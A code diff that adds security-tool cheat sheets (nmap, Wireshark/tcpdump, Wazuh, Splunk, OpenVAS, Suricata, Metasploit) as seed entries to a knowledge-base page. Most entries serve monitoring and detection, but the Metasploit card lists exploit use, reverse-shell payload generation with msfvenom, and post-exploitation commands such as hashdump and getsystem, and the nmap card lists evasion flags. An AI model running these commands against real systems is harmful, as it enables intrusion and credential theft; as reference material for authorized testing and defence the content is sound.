@@ -252,7 +252,7 @@
   <script>
   /* ── Knowledge Base logic ────────────────────────────────────── */
   const KB_KEY   = 'kb_entries';
-  const SEED_KEY = 'kb_seeded_v2';
+  const SEED_KEY = 'kb_seeded_v3';
 
   /* ── Seed entries ────────────────────────────────────────────── */
   const SEED_ENTRIES = [
@@ -387,6 +387,183 @@ Host github.com
 <div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Scripts &amp; Audit</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>npm run &lt;script&gt;</code></td><td>Run a script from package.json</td></tr><tr><td><code>npm start</code></td><td>Run the "start" script</td></tr><tr><td><code>npm test</code></td><td>Run the "test" script</td></tr><tr><td><code>npm run build</code></td><td>Run the "build" script</td></tr><tr><td><code>npm run lint -- --fix</code></td><td>Pass extra args to a script</td></tr><tr><td><code>npm audit</code></td><td>Check for vulnerabilities</td></tr><tr><td><code>npm audit fix</code></td><td>Auto-fix safe vulnerabilities</td></tr><tr><td><code>npm cache clean --force</code></td><td>Wipe local npm cache</td></tr></tbody></table></div></div></div>
 <div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">npx &amp; Global</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>npx create-react-app my-app</code></td><td>Run without global install</td></tr><tr><td><code>npx ts-node script.ts</code></td><td>Run TypeScript directly</td></tr><tr><td><code>npm install -g typescript</code></td><td>Install a package globally</td></tr><tr><td><code>npm list -g --depth=0</code></td><td>List global packages</td></tr><tr><td><code>npm root -g</code></td><td>Global node_modules path</td></tr></tbody></table></div></div></div>
 <div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Versioning &amp; Publishing</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>npm version patch</code></td><td>1.0.0 → 1.0.1</td></tr><tr><td><code>npm version minor</code></td><td>1.0.0 → 1.1.0</td></tr><tr><td><code>npm version major</code></td><td>1.0.0 → 2.0.0</td></tr><tr><td><code>npm publish</code></td><td>Publish to npm registry</td></tr><tr><td><code>npm publish --tag beta</code></td><td>Publish as beta tag</td></tr><tr><td><code>npm pack</code></td><td>Create .tgz for local testing</td></tr></tbody></table></div></div></div>
+</div>`
+    },
+    {
+      id: 1700000008000,
+      title: 'Nmap — Network Scanning',
+      category: 'Cybersecurity / Tools', visibility: 'public', author: 'JRojas',
+      created: 1700000008000,
+      tags: ['nmap', 'scanning', 'network', 'pentest', 'recon', 'cheat-sheet'],
+      summary: 'Nmap host discovery, port scanning techniques, service/OS detection, and NSE scripting — copy-paste ready.',
+      body: `<div class="row g-3">
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Host Discovery</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>nmap -sn 192.168.1.0/24</code></td><td>Ping sweep (no port scan)</td></tr><tr><td><code>nmap -sn -PE 10.0.0.0/8</code></td><td>ICMP echo sweep</td></tr><tr><td><code>nmap -sn --send-ip 192.168.1.0/24</code></td><td>Skip ARP, use IP</td></tr><tr><td><code>nmap -iL hosts.txt -sn</code></td><td>Sweep from list file</td></tr><tr><td><code>nmap -Pn 10.10.10.5</code></td><td>Skip ping, assume host is up</td></tr><tr><td><code>nmap --traceroute 8.8.8.8</code></td><td>Route trace to target</td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Port Scanning</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>nmap -sS 10.10.10.5</code></td><td>SYN (stealth) scan — default</td></tr><tr><td><code>nmap -sT 10.10.10.5</code></td><td>Full TCP connect scan</td></tr><tr><td><code>nmap -sU -p 53,161,500</code></td><td>UDP scan specific ports</td></tr><tr><td><code>nmap -p 80,443,8080</code></td><td>Specific ports</td></tr><tr><td><code>nmap -p 1-1024</code></td><td>Port range</td></tr><tr><td><code>nmap -p-</code></td><td>All 65535 ports</td></tr><tr><td><code>nmap --top-ports 100</code></td><td>Top 100 most common ports</td></tr><tr><td><code>nmap -F</code></td><td>Fast scan (top 100)</td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Service &amp; OS Detection</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>nmap -sV 10.10.10.5</code></td><td>Service version detection</td></tr><tr><td><code>nmap -O 10.10.10.5</code></td><td>OS fingerprinting</td></tr><tr><td><code>nmap -A 10.10.10.5</code></td><td>Aggressive: -sV -O -sC --traceroute</td></tr><tr><td><code>nmap -sV --version-intensity 9</code></td><td>Max version detection effort</td></tr><tr><td><code>nmap -sV --version-light</code></td><td>Faster, less accurate</td></tr></tbody></table><h6 class="card-title text-primary mt-3 mb-2">Timing &amp; Evasion</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>-T0</code> to <code>-T5</code></td><td>Speed: paranoid → insane</td></tr><tr><td><code>-D RND:10</code></td><td>Decoy with 10 random IPs</td></tr><tr><td><code>-f</code></td><td>Fragment packets</td></tr><tr><td><code>--scan-delay 1s</code></td><td>Throttle between probes</td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">NSE Scripts &amp; Output</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>nmap -sC</code></td><td>Default NSE scripts</td></tr><tr><td><code>nmap --script vuln</code></td><td>Run all vuln-category scripts</td></tr><tr><td><code>nmap --script smb-vuln-ms17-010</code></td><td>EternalBlue check</td></tr><tr><td><code>nmap --script http-title</code></td><td>Grab HTTP page titles</td></tr><tr><td><code>nmap --script ssh-hostkey</code></td><td>Get SSH host key info</td></tr><tr><td><code>nmap -oN out.txt</code></td><td>Normal text output</td></tr><tr><td><code>nmap -oX out.xml</code></td><td>XML output</td></tr><tr><td><code>nmap -oG out.gnmap</code></td><td>Greppable output</td></tr><tr><td><code>nmap -oA scan</code></td><td>All three formats at once</td></tr></tbody></table></div></div></div>
+</div>`
+    },
+    {
+      id: 1700000009000,
+      title: 'Wireshark & tcpdump',
+      category: 'Cybersecurity / Tools', visibility: 'public', author: 'JRojas',
+      created: 1700000009000,
+      tags: ['wireshark', 'tcpdump', 'packet-capture', 'network', 'cheat-sheet'],
+      summary: 'tcpdump capture flags and Wireshark display filters for network traffic analysis and incident investigation.',
+      body: `<div class="row g-3">
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">tcpdump — Capture</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>tcpdump -i eth0</code></td><td>Capture on interface eth0</td></tr><tr><td><code>tcpdump -i any</code></td><td>All interfaces</td></tr><tr><td><code>tcpdump -w capture.pcap</code></td><td>Write to file</td></tr><tr><td><code>tcpdump -r capture.pcap</code></td><td>Read from file</td></tr><tr><td><code>tcpdump -n</code></td><td>No DNS resolution</td></tr><tr><td><code>tcpdump -nn</code></td><td>No DNS or port name resolution</td></tr><tr><td><code>tcpdump -c 100</code></td><td>Capture 100 packets then stop</td></tr><tr><td><code>tcpdump -s 0</code></td><td>Capture full packet (no truncation)</td></tr><tr><td><code>tcpdump -v / -vv / -vvv</code></td><td>Increasing verbosity</td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">tcpdump — Filters (BPF)</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>host 10.0.0.5</code></td><td>Traffic to/from host</td></tr><tr><td><code>src host 10.0.0.5</code></td><td>Traffic from host</td></tr><tr><td><code>dst host 10.0.0.5</code></td><td>Traffic to host</td></tr><tr><td><code>port 443</code></td><td>Port 443 only</td></tr><tr><td><code>tcp port 80</code></td><td>TCP port 80</td></tr><tr><td><code>udp</code></td><td>UDP traffic only</td></tr><tr><td><code>net 192.168.1.0/24</code></td><td>Entire subnet</td></tr><tr><td><code>host X and port 443</code></td><td>Combine filters with and/or/not</td></tr><tr><td><code>not port 22</code></td><td>Exclude SSH traffic</td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Wireshark Display Filters</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>ip.addr == 10.0.0.5</code></td><td>Host (src or dst)</td></tr><tr><td><code>ip.src == 10.0.0.5</code></td><td>Source IP only</td></tr><tr><td><code>tcp.port == 443</code></td><td>TCP port 443</td></tr><tr><td><code>http</code></td><td>HTTP traffic</td></tr><tr><td><code>dns</code></td><td>DNS queries/responses</td></tr><tr><td><code>tcp.flags.syn == 1</code></td><td>SYN packets (port scan detection)</td></tr><tr><td><code>http.request.method == "POST"</code></td><td>HTTP POST only</td></tr><tr><td><code>frame contains "password"</code></td><td>Keyword in any field</td></tr><tr><td><code>!(arp or dns or icmp)</code></td><td>Exclude noise protocols</td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Analysis Patterns</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td>Port scan</td><td><code>tcp.flags.syn==1 &amp;&amp; tcp.flags.ack==0</code></td></tr><tr><td>Failed logins</td><td><code>ftp.response.code == 530</code></td></tr><tr><td>Large transfers</td><td><code>frame.len &gt; 1400</code></td></tr><tr><td>Cleartext creds</td><td>Follow TCP stream on port 21/23/80</td></tr><tr><td>C2 beaconing</td><td>Statistics → IO Graph for periodic spikes</td></tr><tr><td>DNS exfil</td><td><code>dns &amp;&amp; dns.qry.name contains "."</code> + long subdomains</td></tr></tbody></table><p class="small mt-2 mb-0"><strong>Tip:</strong> Export objects (File → Export Objects → HTTP) to extract transferred files from a pcap.</p></div></div></div>
+</div>`
+    },
+    {
+      id: 1700000010000,
+      title: 'Wazuh — SIEM & XDR Deployment',
+      category: 'Cybersecurity / SIEM', visibility: 'public', author: 'JRojas',
+      created: 1700000010000,
+      tags: ['wazuh', 'siem', 'xdr', 'ids', 'agent', 'deployment', 'cheat-sheet'],
+      summary: 'Wazuh agent deployment on Linux and Windows, custom rule writing, decoder basics, and alert tuning.',
+      body: `<div class="row g-3">
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Agent Install — Linux</h6><pre class="small mb-0"><code># Add Wazuh repo
+curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH \
+  | gpg --dearmor -o /usr/share/keyrings/wazuh.gpg
+echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] \
+  https://packages.wazuh.com/4.x/apt/ stable main" \
+  | tee /etc/apt/sources.list.d/wazuh.list
+apt update
+WAZUH_MANAGER="YOUR_MANAGER_IP" apt install wazuh-agent -y
+systemctl enable --now wazuh-agent</code></pre></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Agent Install — Windows (PowerShell)</h6><pre class="small mb-0"><code>Invoke-WebRequest -Uri \
+  "https://packages.wazuh.com/4.x/windows/wazuh-agent-4.x.x-1.msi" \
+  -OutFile wazuh-agent.msi
+msiexec /i wazuh-agent.msi /q \
+  WAZUH_MANAGER="YOUR_MANAGER_IP" \
+  WAZUH_REGISTRATION_SERVER="YOUR_MANAGER_IP"
+NET START WazuhSvc</code></pre><p class="small mt-2 mb-0">Verify in Wazuh dashboard → Agents — the new agent should appear as Active.</p></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Custom Rules</h6><p class="small mb-1">Add rules to <code>/var/ossec/etc/rules/local_rules.xml</code>:</p><pre class="small mb-0"><code>&lt;!-- Alert on sudo usage --&gt;
+&lt;rule id="100001" level="10"&gt;
+  &lt;if_sid&gt;5402&lt;/if_sid&gt;
+  &lt;match&gt;sudo&lt;/match&gt;
+  &lt;description&gt;Sudo command executed&lt;/description&gt;
+  &lt;group&gt;sudo,privilege_escalation&lt;/group&gt;
+&lt;/rule&gt;
+
+&lt;!-- Brute-force: 5 failures in 2 min --&gt;
+&lt;rule id="100002" level="12" frequency="5" timeframe="120"&gt;
+  &lt;if_matched_sid&gt;5710&lt;/if_matched_sid&gt;
+  &lt;description&gt;SSH brute-force attempt&lt;/description&gt;
+&lt;/rule&gt;</code></pre></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Useful Commands &amp; Tuning</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>/var/ossec/bin/agent_control -l</code></td><td>List all agents</td></tr><tr><td><code>/var/ossec/bin/ossec-logtest</code></td><td>Test a log line against rules</td></tr><tr><td><code>/var/ossec/bin/wazuh-control restart</code></td><td>Restart manager</td></tr><tr><td><code>tail -f /var/ossec/logs/alerts/alerts.log</code></td><td>Live alert stream</td></tr><tr><td><code>tail -f /var/ossec/logs/ossec.log</code></td><td>Manager diagnostic log</td></tr></tbody></table><p class="small mt-2 mb-0"><strong>Suppress noisy rule:</strong> add <code>&lt;rule id="XXXX" level="0"&gt;&lt;/rule&gt;</code> to local_rules.xml.</p></div></div></div>
+</div>`
+    },
+    {
+      id: 1700000011000,
+      title: 'Splunk — SPL & Search',
+      category: 'Cybersecurity / SIEM', visibility: 'public', author: 'JRojas',
+      created: 1700000011000,
+      tags: ['splunk', 'spl', 'siem', 'log-analysis', 'dashboards', 'cheat-sheet'],
+      summary: 'Splunk SPL query patterns, search commands, data onboarding, and alert configuration for SOC workflows.',
+      body: `<div class="row g-3">
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">SPL Basics</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>index=main</code></td><td>Search default index</td></tr><tr><td><code>index=* sourcetype=syslog</code></td><td>Filter by sourcetype</td></tr><tr><td><code>host=webserver01</code></td><td>Filter by host</td></tr><tr><td><code>source="/var/log/auth.log"</code></td><td>Filter by source file</td></tr><tr><td><code>earliest=-24h latest=now</code></td><td>Time range in query</td></tr><tr><td><code>| head 50</code></td><td>Return first 50 results</td></tr><tr><td><code>| tail 50</code></td><td>Return last 50 results</td></tr><tr><td><code>| fields user, src_ip, action</code></td><td>Keep only named fields</td></tr><tr><td><code>| table _time, host, message</code></td><td>Display as table</td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Search Commands</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>| stats count by src_ip</code></td><td>Count events per source IP</td></tr><tr><td><code>| stats count by user, action</code></td><td>Count by multiple fields</td></tr><tr><td><code>| top 10 src_ip</code></td><td>Top 10 most frequent IPs</td></tr><tr><td><code>| rare user</code></td><td>Least common usernames</td></tr><tr><td><code>| timechart span=1h count by action</code></td><td>Events per hour</td></tr><tr><td><code>| eval risk=if(failed&gt;5,"high","low")</code></td><td>Add computed field</td></tr><tr><td><code>| rename src_ip AS "Source IP"</code></td><td>Rename a field</td></tr><tr><td><code>| dedup src_ip</code></td><td>Remove duplicate IPs</td></tr><tr><td><code>| sort -count</code></td><td>Sort descending by count</td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">SOC Use Cases</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td>Failed logins</td><td><code>index=auth action=failure | stats count by user, src_ip | where count&gt;5</code></td></tr><tr><td>New admin accounts</td><td><code>index=wineventlog EventCode=4720</code></td></tr><tr><td>Privilege escalation</td><td><code>index=wineventlog EventCode=4672</code></td></tr><tr><td>Outbound DNS</td><td><code>index=network dest_port=53 | stats count by dest</code></td></tr><tr><td>Large data transfer</td><td><code>index=proxy bytes_out&gt;10000000 | table src_ip, dest, bytes_out</code></td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Data Onboarding &amp; Alerts</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td>Forwarder install</td><td>Download Universal Forwarder, set <code>SPLUNK_HOME/etc/system/local/inputs.conf</code></td></tr><tr><td>Monitor a file</td><td><code>[monitor:///var/log/nginx/access.log]</code> in inputs.conf</td></tr><tr><td>Set sourcetype</td><td><code>sourcetype = access_combined</code> in inputs.conf</td></tr><tr><td>Create alert</td><td>Save As → Alert → set trigger condition &amp; action</td></tr><tr><td>Scheduled report</td><td>Save As → Report → set schedule &amp; email delivery</td></tr></tbody></table></div></div></div>
+</div>`
+    },
+    {
+      id: 1700000012000,
+      title: 'OpenVAS / Greenbone — Vulnerability Scanning',
+      category: 'Cybersecurity / Scanning', visibility: 'public', author: 'JRojas',
+      created: 1700000012000,
+      tags: ['openvas', 'greenbone', 'vulnerability', 'scanning', 'gvm', 'cheat-sheet'],
+      summary: 'OpenVAS/Greenbone (GVM) installation, scan configuration, target setup, and report interpretation.',
+      body: `<div class="row g-3">
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Install on Kali / Ubuntu</h6><pre class="small mb-0"><code># Kali Linux (easiest)
+apt update && apt install -y gvm
+gvm-setup       # Takes 10-20 min (downloads NVTs)
+gvm-check-setup # Verify everything is healthy
+gvm-start       # Start all services
+
+# Get the admin password shown during setup
+# or reset it:
+runuser -u _gvm -- gvmd \
+  --user=admin --new-password=NewPass123</code></pre></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">CLI with gvm-cli / gvmd</h6><pre class="small mb-0"><code># List targets
+gvm-cli --gmp-username admin \
+  --gmp-password pass socket \
+  --xml "&lt;get_targets/&gt;"
+
+# Create a target (IP or range)
+gvm-cli ... --xml \
+  "&lt;create_target&gt;
+    &lt;name&gt;Lab Network&lt;/name&gt;
+    &lt;hosts&gt;192.168.1.0/24&lt;/hosts&gt;
+  &lt;/create_target&gt;"
+
+# Start a task by ID
+gvm-cli ... --xml \
+  "&lt;start_task task_id='UUID'/&gt;"</code></pre></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Scan Config &amp; Tasks (Web UI)</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td>Login URL</td><td><code>https://127.0.0.1:9392</code></td></tr><tr><td>Add target</td><td>Configuration → Targets → New Target</td></tr><tr><td>Choose scan config</td><td>Full &amp; Fast (default) or Full &amp; Deep</td></tr><tr><td>Create task</td><td>Scans → Tasks → New Task</td></tr><tr><td>Schedule scan</td><td>Configuration → Schedules → New Schedule</td></tr><tr><td>View results</td><td>Scans → Reports → click latest</td></tr><tr><td>Export report</td><td>Report → Download as PDF, XML, or CSV</td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Report Interpretation</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><span class="badge bg-danger">Critical</span></td><td>CVSS 9.0–10.0 — patch immediately</td></tr><tr><td><span class="badge bg-warning text-dark">High</span></td><td>CVSS 7.0–8.9 — patch within 30 days</td></tr><tr><td><span class="badge bg-info text-dark">Medium</span></td><td>CVSS 4.0–6.9 — schedule remediation</td></tr><tr><td><span class="badge bg-secondary">Low</span></td><td>CVSS 0.1–3.9 — document and track</td></tr></tbody></table><p class="small mt-2 mb-0"><strong>Key fields:</strong> CVE ID, CVSS score, affected host/port, solution. Filter by host to create per-asset remediation tickets.</p></div></div></div>
+</div>`
+    },
+    {
+      id: 1700000013000,
+      title: 'Metasploit Framework',
+      category: 'Cybersecurity / Pentest', visibility: 'public', author: 'JRojas',
+      created: 1700000013000,
+      tags: ['metasploit', 'msfconsole', 'exploit', 'pentest', 'ctf', 'cheat-sheet'],
+      summary: 'Metasploit msfconsole workflow for authorized penetration testing and CTF challenges — search, configure, and execute modules.',
+      body: `<div class="row g-3">
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">msfconsole Basics</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>msfconsole</code></td><td>Start the framework</td></tr><tr><td><code>msfconsole -q</code></td><td>Start without banner</td></tr><tr><td><code>help</code></td><td>Show all commands</td></tr><tr><td><code>version</code></td><td>Show MSF version</td></tr><tr><td><code>db_status</code></td><td>Check database connection</td></tr><tr><td><code>workspace -a lab1</code></td><td>Create/switch workspace</td></tr><tr><td><code>db_nmap -sV 10.10.10.5</code></td><td>Nmap scan, store results in DB</td></tr><tr><td><code>hosts</code></td><td>List discovered hosts</td></tr><tr><td><code>services</code></td><td>List discovered services</td></tr><tr><td><code>vulns</code></td><td>List identified vulnerabilities</td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Search &amp; Module Use</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>search type:exploit ms17-010</code></td><td>Search by keyword</td></tr><tr><td><code>search cve:2021-44228</code></td><td>Search by CVE</td></tr><tr><td><code>use 0</code></td><td>Select module by search result #</td></tr><tr><td><code>use exploit/windows/smb/ms17_010_eternalblue</code></td><td>Use by full path</td></tr><tr><td><code>info</code></td><td>Show module description &amp; options</td></tr><tr><td><code>show options</code></td><td>List required/optional options</td></tr><tr><td><code>set RHOSTS 10.10.10.5</code></td><td>Set target host</td></tr><tr><td><code>set LHOST 10.10.14.1</code></td><td>Set listener (attacker) IP</td></tr><tr><td><code>set LPORT 4444</code></td><td>Set listener port</td></tr><tr><td><code>run</code> / <code>exploit</code></td><td>Execute the module</td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Payloads &amp; Handlers</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>show payloads</code></td><td>List compatible payloads</td></tr><tr><td><code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code></td><td>Set Meterpreter payload</td></tr><tr><td><code>use multi/handler</code></td><td>Stand-alone listener</td></tr><tr><td><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=X LPORT=4444 -f elf -o shell</code></td><td>Generate standalone payload</td></tr><tr><td><code>msfvenom -p windows/x64/meterpreter_reverse_tcp -f exe -o shell.exe</code></td><td>Windows exe payload</td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Meterpreter Post-Exploitation</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>sysinfo</code></td><td>Host OS &amp; arch</td></tr><tr><td><code>getuid</code></td><td>Current user</td></tr><tr><td><code>getsystem</code></td><td>Attempt privilege escalation</td></tr><tr><td><code>hashdump</code></td><td>Dump local password hashes</td></tr><tr><td><code>ps</code></td><td>List running processes</td></tr><tr><td><code>migrate PID</code></td><td>Move into another process</td></tr><tr><td><code>shell</code></td><td>Drop to OS shell</td></tr><tr><td><code>download file.txt</code></td><td>Pull file to attacker machine</td></tr><tr><td><code>upload nc.exe C:\\\\</code></td><td>Push file to target</td></tr><tr><td><code>background</code></td><td>Background session</td></tr><tr><td><code>sessions -l</code></td><td>List all sessions</td></tr><tr><td><code>sessions -i 1</code></td><td>Interact with session 1</td></tr></tbody></table></div></div></div>
+</div>`
+    },
+    {
+      id: 1700000014000,
+      title: 'Suricata — IDS/IPS Deployment',
+      category: 'Cybersecurity / IDS-IPS', visibility: 'public', author: 'JRojas',
+      created: 1700000014000,
+      tags: ['suricata', 'ids', 'ips', 'nids', 'rules', 'network-security', 'cheat-sheet'],
+      summary: 'Suricata installation, IDS vs IPS mode config, rule syntax, Emerging Threats ruleset, and log parsing.',
+      body: `<div class="row g-3">
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Install &amp; Initial Setup</h6><pre class="small mb-0"><code># Ubuntu/Debian
+add-apt-repository ppa:oisf/suricata-stable
+apt update && apt install -y suricata
+
+# AlmaLinux / RHEL
+dnf install -y epel-release
+dnf install -y suricata
+
+# Update Emerging Threats ruleset
+suricata-update
+
+# Test config
+suricata -T -c /etc/suricata/suricata.yaml -v
+
+# Run in IDS mode (read-only, logs only)
+suricata -c /etc/suricata/suricata.yaml -i eth0</code></pre></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">IDS vs IPS Mode</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><strong>IDS (NFLOG)</strong></td><td>Logs alerts, does not block. Use <code>-i eth0</code></td></tr><tr><td><strong>IPS (NFQUEUE)</strong></td><td>Inline mode — can drop traffic</td></tr></tbody></table><p class="small mt-2 mb-1"><strong>IPS via iptables (inline):</strong></p><pre class="small mb-0"><code>iptables -I FORWARD -j NFQUEUE
+iptables -I INPUT -j NFQUEUE
+iptables -I OUTPUT -j NFQUEUE
+suricata -c /etc/suricata/suricata.yaml \
+  -q 0</code></pre><p class="small mt-2 mb-0">Set <code>af-packet</code> mode in suricata.yaml for high-throughput deployments.</p></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Rule Syntax</h6><pre class="small mb-0"><code># Action  Proto  Src       SrcPort  Dir  Dst       DstPort
+alert     tcp    any       any      ->   $HOME_NET  22  \
+  (msg:"SSH scan detected"; \
+   flags:S; threshold: type threshold, \
+   track by_src, count 5, seconds 60; \
+   classtype:attempted-recon; \
+   sid:9000001; rev:1;)
+
+# Drop outbound on port 4444 (Meterpreter)
+drop tcp $HOME_NET any -> any 4444 \
+  (msg:"Possible Meterpreter C2"; \
+   sid:9000002; rev:1;)</code></pre></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Logs &amp; Operations</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>/var/log/suricata/fast.log</code></td><td>Human-readable alert log</td></tr><tr><td><code>/var/log/suricata/eve.json</code></td><td>JSON log (ingest into SIEM)</td></tr><tr><td><code>/var/log/suricata/stats.log</code></td><td>Performance counters</td></tr><tr><td><code>suricata-update list-sources</code></td><td>Show available rule feeds</td></tr><tr><td><code>suricata-update enable-source et/open</code></td><td>Enable Emerging Threats</td></tr><tr><td><code>suricata-update update</code></td><td>Pull latest rules</td></tr><tr><td><code>systemctl reload suricata</code></td><td>Reload rules without restart</td></tr><tr><td><code>suricatasc -c "iface-stat eth0"</code></td><td>Live interface stats</td></tr></tbody></table></div></div></div>
 </div>`
     },
   ];
